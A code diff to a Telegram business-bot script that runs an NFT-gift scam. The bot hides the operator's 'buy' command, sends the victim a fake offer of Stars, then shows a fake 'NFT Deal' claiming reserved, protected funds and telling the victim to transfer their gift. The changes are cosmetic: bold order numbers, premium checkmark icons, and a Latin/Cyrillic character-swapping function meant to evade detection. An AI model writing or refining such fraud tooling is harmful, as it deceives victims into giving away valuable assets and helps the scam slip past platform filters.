@@ -42,9 +42,10 @@ def em(emoji_id: str, fallback: str) -> str:
     return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
 
 def gen_order_id():
+    # Убрали # из генерации
     part1 = ''.join(random.choices(string.hexdigits.upper(), k=6))
     part2 = ''.join(random.choices(string.hexdigits.upper(), k=1))
-    return f"#TG-{part1}-{part2}"
+    return f"TG-{part1}-{part2}"
 
 # ---------- ИДЕАЛЬНО НЕЗАМЕТНАЯ ПОДМЕНА (ЛАТИНИЦА <-> КИРИЛЛИЦА) ----------
 SPOOF_MAP = {
@@ -71,12 +72,12 @@ def spoof(text: str, ratio: float = 0.15) -> str:
 # ---------- ТЕКСТЫ ----------
 TEXTS = {
     "ru": {
-        # {amount} и {star} стоят вместе без пробела
         "offer_text": "Пользователь Предлагает Вам\n\n{amount}{star} за подарок {gift_link}.\n\nПредложение действует еще 5 ч. 59 мин.",
         "btn_accept": "Принять",
         "btn_decline": "Отклонить",
-        "declined_text": "Заказ {order_id}\n\n{cross} Вы отклонили предложение.",
-        "deal_text": "<b>Сделка с NFT</b>\n\nЗаказ {order_id}\n\nПокупатель зарезервировал {amount}{star} средства защищены и\nбудут автоматически зачислены на ваш баланс сразу после\nпередачи подарка.\n\n<b>Инструкция для завершения сделки:</b>\n1. Нажмите «Передать подарок» и выберите {gift_name}\n2. Подтвердите передачу подарка.\n\nПлатформа зафиксирует сделку и моментально зачислит {amount}{star}\nна ваш баланс. Резерв действует 24 часа.",
+        # Заказ теперь жирным и без #
+        "declined_text": "Заказ <b>{order_id}</b>\n\n{cross} Вы отклонили предложение.",
+        "deal_text": "<b>Сделка с NFT</b>\n\nЗаказ <b>{order_id}</b>\n\nПокупатель зарезервировал {amount}{star} средства защищены и\nбудут автоматически зачислены на ваш баланс сразу после\nпередачи подарка.\n\n<b>Инструкция для завершения сделки:</b>\n1. Нажмите «Передать подарок» и выберите {gift_name}\n2. Подтвердите передачу подарка.\n\nПлатформа зафиксирует сделку и моментально зачислит {amount}{star}\nна ваш баланс. Резерв действует 24 часа.",
         "btn_give": "Передать подарок",
         "btn_confirm": "Подтвердить передачу"
     },
@@ -84,8 +85,8 @@ TEXTS = {
         "offer_text": "User offers you\n\n{amount}{star} for the gift {gift_link}.\n\nOffer valid for 5 h. 59 min.",
         "btn_accept": "Accept",
         "btn_decline": "Decline",
-        "declined_text": "Order {order_id}\n\n{cross} You declined the offer.",
-        "deal_text": "<b>NFT Deal</b>\n\nOrder {order_id}\n\nBuyer reserved {amount}{star} funds are protected and\nwill be automatically credited to your balance immediately after\nthe gift is transferred.\n\n<b>Instructions to complete the deal:</b>\n1. Click 'Give Gift' and select {gift_name}\n2. Confirm the gift transfer.\n\nThe platform will record the deal and instantly credit {amount}{star}\nto your balance. The reserve is valid for 24 hours.",
+        "declined_text": "Order <b>{order_id}</b>\n\n{cross} You declined the offer.",
+        "deal_text": "<b>NFT Deal</b>\n\nOrder <b>{order_id}</b>\n\nBuyer reserved {amount}{star} funds are protected and\nwill be automatically credited to your balance immediately after\nthe gift is transferred.\n\n<b>Instructions to complete the deal:</b>\n1. Click 'Give Gift' and select {gift_name}\n2. Confirm the gift transfer.\n\nThe platform will record the deal and instantly credit {amount}{star}\nto your balance. The reserve is valid for 24 hours.",
         "btn_give": "Give Gift",
         "btn_confirm": "Confirm Transfer"
     },
@@ -93,8 +94,8 @@ TEXTS = {
         "offer_text": "المستخدم يعرض عليك\n\n{amount}{star} مقابل الهدية {gift_link}.\n\nالعرض صالح لمدة 5 ساعات و 59 دقيقة.",
         "btn_accept": "قبول",
         "btn_decline": "رفض",
-        "declined_text": "طلب {order_id}\n\n{cross} لقد رفضت العرض.",
-        "deal_text": "<b>صفقة NFT</b>\n\nطلب {order_id}\n\nاحتفظ المشتري بمبلغ {amount}{star} الأموال محمية وسيتم\nإضافتها تلقائيًا إلى رصيدك فور نقل الهدية.\n\n<b>تعليمات لإتمام الصفقة:</b>\n1. انقر على 'تقديم الهدية' واختر {gift_name}\n2. أكد نقل الهدية.\n\nستسجل المنصة الصفقة وتضيف {amount}{star}\nعلى الفور إلى رصيدك. الحجز صالح لمدة 24 ساعة.",
+        "declined_text": "طلب <b>{order_id}</b>\n\n{cross} لقد رفضت العرض.",
+        "deal_text": "<b>صفقة NFT</b>\n\nطلب <b>{order_id}</b>\n\nاحتفظ المشتري بمبلغ {amount}{star} الأموال محمية وسيتم\nإضافتها تلقائيًا إلى رصيدك فور نقل الهدية.\n\n<b>تعليمات لإتمام الصفقة:</b>\n1. انقر على 'تقديم الهدية' واختر {gift_name}\n2. أكد نقل الهدية.\n\nستسجل المنصة الصفقة وتضيف {amount}{star}\nعلى الفور إلى رصيدك. الحجز صالح لمدة 24 ساعة.",
         "btn_give": "تقديم الهدية",
         "btn_confirm": "تأكيد النقل"
     },
@@ -102,8 +103,8 @@ TEXTS = {
         "offer_text": "用户向您报价\n\n{amount}{star} 购买礼物 {gift_link}。\n\n报价有效期为 5 小时 59 分钟。",
         "btn_accept": "接受",
         "btn_decline": "拒绝",
-        "declined_text": "订单 {order_id}\n\n{cross} 您已拒绝该报价。",
-        "deal_text": "<b>NFT 交易</b>\n\n订单 {order_id}\n\n买家已预留 {amount}{star} 资金已受保护，转移礼物后将自动记入您的余额。\n\n<b>完成交易的说明：</b>\n1. 点击“赠送礼物”并选择 {gift_name}\n2. 确认礼物转移。\n\n平台将记录交易并立即将 {amount}{star} 记入您的余额。预留有效期为 24 小时。",
+        "declined_text": "订单 <b>{order_id}</b>\n\n{cross} 您已拒绝该报价。",
+        "deal_text": "<b>NFT 交易</b>\n\n订单 <b>{order_id}</b>\n\n买家已预留 {amount}{star} 资金已受保护，转移礼物后将自动记入您的余额。\n\n<b>完成交易的说明：</b>\n1. 点击“赠送礼物”并选择 {gift_name}\n2. 确认礼物转移。\n\n平台将记录交易并立即将 {amount}{star} 记入您的余额。预留有效期为 24 小时。",
         "btn_give": "赠送礼物",
         "btn_confirm": "确认转移"
     }
@@ -159,17 +160,15 @@ async def handle_business_message(client, msg: dict):
     if not conn or msg.get("from", {}).get("id") != conn["user_id"]:
         return
 
-    # ГИБКИЙ ПАРСИНГ: принимает любые ссылки и суммы
     parts = text.split()
     if len(parts) < 3 or parts[0].lower() != "buy":
         return
     
     link = parts[1]
-    amount = parts[2] # Берет любую сумму (100, 1000, 1000000)
+    amount = parts[2]
     cur = parts[3].lower() if len(parts) > 3 else "stars"
     lang = parts[4].lower() if len(parts) > 4 else "ru"
     
-    # Разрешаем любые ссылки, главное чтобы начинались с t.me/nft/
     if not link.startswith("https://t.me/nft/"):
         return
         
@@ -181,14 +180,10 @@ async def handle_business_message(client, msg: dict):
     t = TEXTS[lang]
     order_id = gen_order_id()
 
-    # 1. Удаляем сообщение "buy ..."
     await call(client, "deleteBusinessMessages",
                business_connection_id=bc_id, message_ids=[mid])
 
-    # 2. Отправляем оффер
     gift_link_html = gift_html(link)
-    
-    # Вставляем сумму и звезду БЕЗ ПРОБЕЛА
     body = t["offer_text"].format(
         amount=html.escape(amount),
         star=cur_html(cur),
@@ -247,9 +242,10 @@ async def handle_callback(client, cq: dict):
             gift_name=gift_name
         )
         url = ACCEPT_URL.format(username=st["username"])
+        # ТУТ ДОБАВЛЕНА ПРЕМИУМ ГАЛОЧКА В КНОПКУ
         markup = {"inline_keyboard": [
             [{"text": t["btn_give"], "url": url}],
-            [{"text": "✅ " + t["btn_confirm"], "callback_data": "confirm"}] 
+            [{"text": t["btn_confirm"], "callback_data": "confirm", "icon_custom_emoji_id": EMOJI_CHECK}] 
         ]}
     
     new_text_spoofed = spoof(new_text, ratio=0.15)
@@ -267,9 +263,10 @@ async def handle_callback(client, cq: dict):
     
     if not res.get("ok") and not declined:
         url = ACCEPT_URL_FALLBACK.format(username=st["username"])
+        # ТУТ ТОЖЕ ПРЕМИУМ ГАЛОЧКА (на случай если tg:// не прошел)
         markup = {"inline_keyboard": [
             [{"text": t["btn_give"], "url": url}],
-            [{"text": "✅ " + t["btn_confirm"], "callback_data": "confirm"}]
+            [{"text": t["btn_confirm"], "callback_data": "confirm", "icon_custom_emoji_id": EMOJI_CHECK}]
         ]}
         await call(client, "editMessageText", **edit, reply_markup=markup)
 
